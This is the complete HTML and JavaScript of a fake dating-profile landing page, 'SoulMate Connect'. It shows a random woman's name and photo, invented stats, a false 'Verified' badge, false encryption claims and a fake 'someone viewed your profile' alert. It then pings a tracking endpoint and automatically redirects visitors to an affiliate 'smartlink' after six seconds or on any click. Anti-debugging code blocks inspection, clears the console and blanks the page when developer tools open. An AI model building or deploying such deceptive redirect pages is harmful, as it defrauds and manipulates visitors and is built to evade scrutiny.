<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Find Your Match - SoulMate Connect</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ðŸ”¥</text></svg>">
    <style>
        /* --- RESET & BASE --- */
        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
        body{
            font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background:#0f0f12;
            overflow:hidden;
            height:100vh;
            color:#fff;
            position:relative;
            user-select:none;
            -webkit-user-select:none;
        }

        /* --- BACKGROUND VIDEO --- */
        .bg-wrapper{position:absolute;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden;}
        .bg-video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;transform:translate(-50%,-50%);object-fit:cover;opacity:0.4;}
        .bg-overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(to bottom, rgba(0,0,0,0.3), rgba(0,0,0,0.8));z-index:0;}
        .fallback-bg{position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg, #ff416c, #ff4b2b);z-index:-2;display:none;}

        /* --- MAIN LAYOUT (CENTERED CARD) --- */
        .app-container{
            position:relative;
            z-index:10;
            height:100vh;
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            padding:20px;
        }

        /* --- CARD STYLE --- */
        .profile-card{
            background:rgba(255, 255, 255, 0.1);
            backdrop-filter:blur(12px);
            -webkit-backdrop-filter:blur(12px);
            border:1px solid rgba(255,255,255,0.15);
            border-radius:24px;
            padding:30px 20px;
            width:100%;
            max-width:420px;
            text-align:center;
            box-shadow:0 15px 35px rgba(0,0,0,0.5);
            animation:cardEntrance 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
            opacity:0;
            transform:translateY(30px);
        }

        @keyframes cardEntrance{
            to{opacity:1;transform:translateY(0)}
        }

        /* --- PROFILE SECTION --- */
        .profile-header{position:relative;display:inline-block;margin-bottom:15px;}
        .profile-img-container{
            width:120px;height:120px;
            border-radius:50%;
            padding:4px;
            background:linear-gradient(45deg, #ff416c, #ff4b2b);
            margin:0 auto;
            position:relative;
        }
        .profile-img-container img{
            width:100%;height:100%;border-radius:50%;object-fit:cover;border:3px solid #1a1a1a;
        }
        .online-badge{
            position:absolute;bottom:8px;right:8px;
            background:#2ecc71;border:2px solid #1a1a1a;
            width:18px;height:18px;border-radius:50%;
            box-shadow:0 0 10px rgba(46, 204, 113, 0.5);
            animation:pulseGreen 2s infinite;
        }

        .profile-name{font-size:26px;font-weight:700;margin:5px 0 2px;text-shadow:0 2px 4px rgba(0,0,0,0.5);}
        .profile-meta{font-size:15px;color:#ddd;margin-bottom:15px;display:flex;align-items:center;justify-content:center;gap:8px;}
        .verified-icon{color:#3498db;font-size:14px;}
        .location-text{font-size:13px;opacity:0.7;}

        /* --- STATS GRID --- */
        .stats-grid{
            display:flex;justify-content:space-between;
            background:rgba(0,0,0,0.2);
            border-radius:12px;
            padding:15px;
            margin-bottom:20px;
        }
        .stat-item{flex:1;text-align:center;border-right:1px solid rgba(255,255,255,0.1);}
        .stat-item:last-child{border-right:none;}
        .stat-num{display:block;font-size:18px;font-weight:700;color:#ff4b2b;}
        .stat-label{font-size:11px;opacity:0.6;text-transform:uppercase;letter-spacing:0.5px;margin-top:4px;}

        /* --- ACTION BUTTONS (ICONS) --- */
        .quick-actions{display:flex;justify-content:center;gap:20px;margin-bottom:25px;}
        .action-btn{
            background:rgba(255,255,255,0.05);
            border:1px solid rgba(255,255,255,0.1);
            width:50px;height:50px;border-radius:50%;
            display:flex;align-items:center;justify-content:center;
            color:#fff;font-size:18px;cursor:pointer;
            transition:all 0.3s ease;
            text-decoration:none;
        }
        .action-btn:hover{background:#ff4b2b;border-color:#ff4b2b;transform:scale(1.1);}
        .tooltip{
            position:absolute;bottom:-30px;left:50%;transform:translateX(-50%);
            background:#000;font-size:10px;padding:4px 8px;border-radius:4px;
            opacity:0;pointer-events:none;transition:opacity 0.2s;white-space:nowrap;
        }
        .action-btn:hover .tooltip{opacity:1;}

        /* --- MAIN CTA BUTTON --- */
        .cta-btn{
            background:linear-gradient(90deg, #ff416c, #ff4b2b);
            color:#fff;border:none;
            width:100%;padding:16px;border-radius:50px;
            font-size:17px;font-weight:700;
            cursor:pointer;
            box-shadow:0 10px 20px rgba(255, 75, 43, 0.3);
            position:relative;overflow:hidden;
            display:flex;align-items:center;justify-content:center;gap:10px;
            transition:transform 0.2s;
        }
        .cta-btn:active{transform:scale(0.98);}
        .cta-btn i{font-size:20px;}
        .cta-btn.disabled{opacity:0.8;cursor:wait;filter:grayscale(0.5);}

        /* --- SECURITY FOOTER --- */
        .security-footer{
            margin-top:25px;
            text-align:center;
            font-size:11px;
            opacity:0.5;
            line-height:1.6;
        }
        .security-icons i{margin:0 5px;color:#2ecc71;}

        /* --- ANIMATIONS --- */
        @keyframes pulseGreen{
            0%{box-shadow:0 0 0 0 rgba(46, 204, 113, 0.7);}
            70%{box-shadow:0 0 0 6px rgba(46, 204, 113, 0);}
            100%{box-shadow:0 0 0 0 rgba(46, 204, 113, 0);}
        }
        
        /* Notification Toast */
        .toast{
            position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-100px);
            background:rgba(0,0,0,0.85);backdrop-filter:blur(5px);
            padding:10px 20px;border-radius:30px;
            font-size:13px;display:flex;align-items:center;gap:10px;
            z-index:100;transition:transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            border:1px solid rgba(255,255,255,0.1);
        }
        .toast.show{transform:translateX(-50%) translateY(0);}
        .toast i{color:#ff4b2b;}

    </style>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

    <!-- Background Elements -->
    <div class="bg-wrapper">
        <div class="fallback-bg" id="fallbackBg"></div>
        <video class="bg-video" id="bgVideo" autoplay muted loop playsinline preload="auto"></video>
        <div class="bg-overlay"></div>
    </div>

    <!-- Notification Toast -->
    <div class="toast" id="toastMsg">
        <i class="fas fa-bell"></i> <span>Someone nearby viewed your profile!</span>
    </div>

    <div class="app-container">
        <div class="profile-card">
            
            <!-- Profile Header -->
            <div class="profile-header">
                <div class="profile-img-container">
                    <img id="profilePhoto" src="" alt="User">
                    <div class="online-badge"></div>
                </div>
            </div>
            
            <h2 class="profile-name" id="userName">Loading...</h2>
            <div class="profile-meta">
                <span class="verified-icon"><i class="fas fa-check-circle"></i> Verified</span>
                <span>â€¢</span>
                <span>23 y.o.</span>
                <span>â€¢</span>
                <span class="location-text"><i class="fas fa-map-marker-alt"></i> < 1km away</span>
            </div>

            <!-- Stats -->
            <div class="stats-grid">
                <div class="stat-item">
                    <span class="stat-num" id="statPhotos">6</span>
                    <span class="stat-label">Photos</span>
                </div>
                <div class="stat-item">
                    <span class="stat-num" id="statMatches">842</span>
                    <span class="stat-label">Matches</span>
                </div>
                <div class="stat-item">
                    <span class="stat-num" id="statScore">98%</span>
                    <span class="stat-label">Comp.</span>
                </div>
            </div>

            <!-- Quick Actions -->
            <div class="quick-actions">
                <div class="action-btn" id="btnChat" onclick="handleClick()">
                    <i class="fas fa-comment-alt"></i>
                    <span class="tooltip">Chat</span>
                </div>
                <div class="action-btn" id="btnVideo" onclick="handleClick()">
                    <i class="fas fa-video"></i>
                    <span class="tooltip">Video</span>
                </div>
                <div class="action-btn" id="btnNearby" onclick="handleClick()">
                    <i class="fas fa-location-arrow"></i>
                    <span class="tooltip">Nearby</span>
                </div>
            </div>

            <!-- Main CTA -->
            <button class="cta-btn" id="mainButton">
                <i class="fab fa-whatsapp"></i>
                <span>Connect via WhatsApp</span>
            </button>

            <!-- Footer Security -->
            <div class="security-footer">
                <div class="security-icons">
                    <i class="fas fa-lock"></i>
                    <i class="fas fa-shield-alt"></i>
                    <i class="fas fa-user-shield"></i>
                </div>
                End-to-end encrypted â€¢ 18+ Community â€¢ Private & Secure
            </div>

        </div>
    </div>

    <script>
        // --- SECURITY & ANTI-DEBUG SCRIPTS (SAME AS ORIGINAL) ---
        document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
        document.addEventListener('keydown', function(e) {
            if(e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
               (e.ctrlKey && e.shiftKey && e.keyCode === 74) || (e.ctrlKey && e.keyCode === 85) ||
               (e.ctrlKey && e.keyCode === 67) || (e.ctrlKey && e.keyCode === 86) ||
               (e.ctrlKey && e.keyCode === 88) || (e.ctrlKey && e.keyCode === 65) ||
               (e.ctrlKey && e.keyCode === 83) || (e.ctrlKey && e.keyCode === 80)) {
                e.preventDefault(); return false;
            }
        });
        document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
        document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
        
        setInterval(function() {
            if(window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
                window.location.replace("about:blank");
            }
        }, 500);

        console.clear();
        setInterval(function() {
            console.clear();
            console.log("%cSecure Connection Active", "color: #ff4b2b; font-size: 40px; font-weight: bold;");
        }, 1000);

        // --- CONFIGURATION & LOGIC ---
        const SMARTLINK = "https://ceafgif.flirtpixel.com/s/192278ad6a62d?sub1=KAHF&subsource=KAHF"; 
        let TARGET_URL = SMARTLINK;

        // Assets
        const profilePhotos = [
            "https://files.catbox.moe/blc5hs.png", 
            "https://files.catbox.moe/pjlwxp.jpg",
            "https://files.catbox.moe/p8q9ys.jpg",
            "https://files.catbox.moe/0y1tmh.jpg"
        ];

        const videoList = [
            "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
            "https://files.catbox.moe/y2fr1u.mp4",
            "https://files.catbox.moe/jytnih.mp4",
            "https://files.catbox.moe/1q99k0.mp4",
            "https://thumbsnap.com/i/2ycQSNZa.mp4"
        ];

        // Generators
        const firstNames = ["Sarah","Jessica","Emily","Sophia","Olivia","Emma","Ava","Isabella","Mia","Charlotte","Amelia","Harper","Evelyn","Abigail","Elizabeth","Diana","Kate","Anna"];
        const lastNames = ["Johnson","Smith","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson"];
        
        function getRandomName(){
            return firstNames[Math.floor(Math.random()*firstNames.length)] + " " + lastNames[Math.floor(Math.random()*lastNames.length)];
        }

        function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        // URL Construction
        const params = new URLSearchParams(window.location.search);
        let finalUrl = TARGET_URL + (params.toString() ? (TARGET_URL.includes('?') ? '&' : '?') + params.toString() : '');

        // Redirect Function
        function doRedirect() {
            location.href = finalUrl;
        }

        // Video Loading Logic
        const videoEl = document.getElementById('bgVideo');
        let currentVideoIndex = 0;

        function loadVideo() {
            videoEl.src = videoList[currentVideoIndex];
            videoEl.load();
            videoEl.play().then(() => {
                console.log("Video playing");
            }).catch(error => {
                console.log("Autoplay blocked or error", error);
                nextVideo();
            });
            videoEl.onerror = nextVideo;
        }

        function nextVideo() {
            currentVideoIndex = (currentVideoIndex + 1) % videoList.length;
            if(currentVideoIndex !== 0) {
                loadVideo();
            } else {
                document.getElementById('fallbackBg').style.display = 'block';
            }
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            // 1. Tracking
            fetch('https://imopol.dasboardkramat.workers.dev/track?cid=KAHF', { method: 'GET', keepalive: true });

            // 2. Load Video
            currentVideoIndex = Math.floor(Math.random() * videoList.length);
            loadVideo();

            // 3. Populate Content
            const rName = getRandomName();
            document.getElementById('userName').textContent = rName;
            document.getElementById('profilePhoto').src = profilePhotos[Math.floor(Math.random() * profilePhotos.length)];
            
            document.getElementById('statPhotos').textContent = getRandomInt(3, 8);
            document.getElementById('statMatches').textContent = getRandomInt(500, 2000);
            document.getElementById('statScore').textContent = getRandomInt(85, 99) + "%";

            // 4. Toast Animation
            setTimeout(() => {
                document.getElementById('toastMsg').classList.add('show');
                setTimeout(() => {
                    document.getElementById('toastMsg').classList.remove('show');
                }, 4000);
            }, 2000);

            // 5. Button Logic
            const mainBtn = document.getElementById('mainButton');
            
            function handleClick() {
                mainBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Matching...';
                mainBtn.classList.add('disabled');
                setTimeout(doRedirect, 800);
            }

            mainBtn.onclick = handleClick;
            
            // Global click to ensure video plays (mobile policy)
            document.body.onclick = () => {
                if(videoEl.paused) videoEl.play().catch(()=>{});
            };
        });

        // Auto Redirect Timer (6 Seconds)
        setTimeout(() => {
            doRedirect();
        }, 6 * 1000);

    </script>
</body>
</html>
